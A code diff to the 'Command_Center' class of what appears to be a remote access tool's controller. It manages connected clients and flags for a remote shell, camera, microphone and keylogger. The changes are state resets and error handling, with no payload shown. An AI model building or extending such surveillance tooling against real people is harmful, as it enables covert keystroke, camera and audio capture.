@@ -207,6 +207,9 @@ class Command_Center():
                                     return
                             elif self.status_keylogger == True and msg != 'exit':
                                 self.PrintSmart('[-] Keylogger is running in a Client')
+                                if self.MODE == 'graphic':
+                                    self.entry_status = False
+                                    return
                                 continue
                             if msg == 'shell':
                                 self.status_shell = True
@@ -367,11 +370,14 @@ class Command_Center():
     def update_scroll_region(self,event):
         self.canvas.configure(scrollregion=self.canvas.bbox("all"))
     def GetClientIndexGUI(self,client_address):
-        for i in range(len(self.Clients)):
-            if self.Clients[i].get_extra_info('peername') == client_address:
-                self.current_client_index = i
-                break
-        self.console_frame.set('current client')
+        try:
+            for i in range(len(self.Clients)):
+                if self.Clients[i].get_extra_info('peername') == client_address:
+                    self.current_client_index = i
+                    break
+            self.console_frame.set('current client')
+        except:
+            self.Clients = []
     def ButtonsCurrentClient(self,opt):
         if len(self.Clients) == 0:
             self.current_client_index = None
@@ -683,6 +689,11 @@ class Command_Center():
 
     async def CloseServer(self):
         self.status = False
+        self.status_shell = False
+        self.status_camera = False
+        self.status_mic = False
+        self.status_keylogger = False
+        self.entry_status = False
         for client in self.Clients:
             client.close()
             #await client.wait_closed()
@@ -690,6 +701,11 @@ class Command_Center():
     
     def CloseServer_notAsync(self):
         self.status = False
+        self.status_shell = False
+        self.status_camera = False
+        self.status_mic = False
+        self.status_keylogger = False
+        self.entry_status = False
         for button in self.buttons_clients:
             button.destroy()
 
